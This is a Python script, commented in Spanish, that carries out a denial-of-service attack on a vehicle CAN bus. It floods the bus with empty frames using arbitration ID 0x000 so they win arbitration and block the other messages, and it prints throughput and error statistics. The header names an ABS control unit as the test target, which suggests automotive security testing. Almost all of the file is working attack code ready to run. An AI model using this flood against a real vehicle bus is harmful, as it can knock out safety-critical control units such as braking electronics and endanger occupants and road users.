#!/usr/bin/env python

# > Autor: Alejandro Carballo
# > Centralita de pruebas: ATE/TEVES MK60e o MK61
# > Interfaz física de pruebas: Makerbase CANable 2.0 Pro (socketcan)
# > Interfaz lógica de pruebas: Socketcan a través de adaptador virtual (vcan)
#
# Programa para realizar un ataque de denegación de servicio (o DoS) a un bus CAN
# Se explota el sistema de arbitraje de CAN utilizando el ID de mayor prioridad (0x000)
# A través de este ID, este paquete gana el arbitraje, y se propaga por el bus antes que otros IDs
# Al saturar el bus al máximo con este paquete, el resto de IDs no transmiten, o a una frecuencia muy baja
#
# Se integra un sleep para no enviar continuamente mensaje, ya que satura la interfaz CANable, regulable
# a través de la variable -->iface_limit<--
#
# La actualización de la pantalla por consola ocurre cuando se levanta un CanError al enviar mensajes en
# bucle, lo que indica que se está rozando el límite de envío de la interfaz utilizada
# Para conseguir que la pantalla se actualice cuando no surgen CanError, se parametriza un valor de 
# tiempo por el que se pausa momentáneamente la ejecución para imprimir: -->halt_event<-- 

import can
import os
import time

# Contadores
counter_OK = 0      # Peticiones OK
counter_KO = 0      # Peticiones KO por CanError
halt_event = 0      # Parada de envío automático para imprimir por pantalla
count_period = 0    # Periodos de impresión, causados por CanError o HaltEvent

# Medidas - medias de pps y periodos
median_pps = 0          # Media de peticiones por segundo
median_periods = 0      # Media de timepo pasado por periodo (s) 

# Temporizadores
start_time = time.time()    # Timestamp inicio
halt_time = 3               # Segundos para desencadenar evento HaltEvent
iface_limit = 0.000005      # Sleep para no sobrepasar el límite de envío de la interfaz hw (CANable)

class HaltEvent(Exception):
    pass

def median_calc(median, unit, periods):
    if float(f"{unit:.2f}") > 0 and periods > 1:
        median_aux = median * (periods - 1)
        return (median_aux + unit) / periods
    else:
        return median if median != 0 else float(f"{unit:.2f}")
    

if __name__ == "__main__":
    # bus = can.Bus(interface='socketcan', channel='slcan0', bitrate=1000000)
    bus = can.Bus(interface='socketcan', channel='can1', bitrate=500000)
    
    # Mensaje ID 0x000 con campo de datos vacío
    msg = can.Message(arbitration_id=0x0, data=[], is_extended_id=False)
    
    program_start_time = time.time()
    
    while True:
        try:
            start_time = time.time()
            count_period = 0
            while True:
                bus.send(msg)
                if iface_limit > 0:
                    time.sleep(iface_limit)
                count_period += 1
                if count_period >= median_pps*4 and time.time() - start_time >= halt_time:
                    raise HaltEvent()
        except can.CanError:
            counter_KO += 1
        except HaltEvent:   # Cada x segundos, se para para refrescar output si no ha surgido CanError
            halt_event += 1
        
        os.system("clear")
        
        counter_OK = counter_OK + count_period
        fail_rate = (counter_KO / counter_OK) * 100
        period_time = time.time() - start_time
        pps = count_period / period_time
        total_periods = (counter_KO + halt_event)
        median_pps = median_calc(median_pps, pps, total_periods)
        median_periods = median_calc(median_periods, period_time, total_periods)
        
        print(f"Paquetes lanzados: {counter_OK} en bus {bus.channel_info}")
        print(f"Paquetes por segundo (pps) del último periodo {pps:.2f}")
        print(f"Paquetes por segundo (pps) medio {median_pps:.2f}")
        print(f"Paquetes con error: {counter_KO} // Evento Halt: {halt_event}")
        print(f"Último periodo de tiempo {period_time:.2f}s")
        print(f"Tiempo medio de periodos {median_periods:.2f}s")
        print(f"Tasa de fallo {fail_rate:.3f}%")
        print(f"\nTiempo de ejecución del script: {(time.time() - program_start_time):.2f}s")
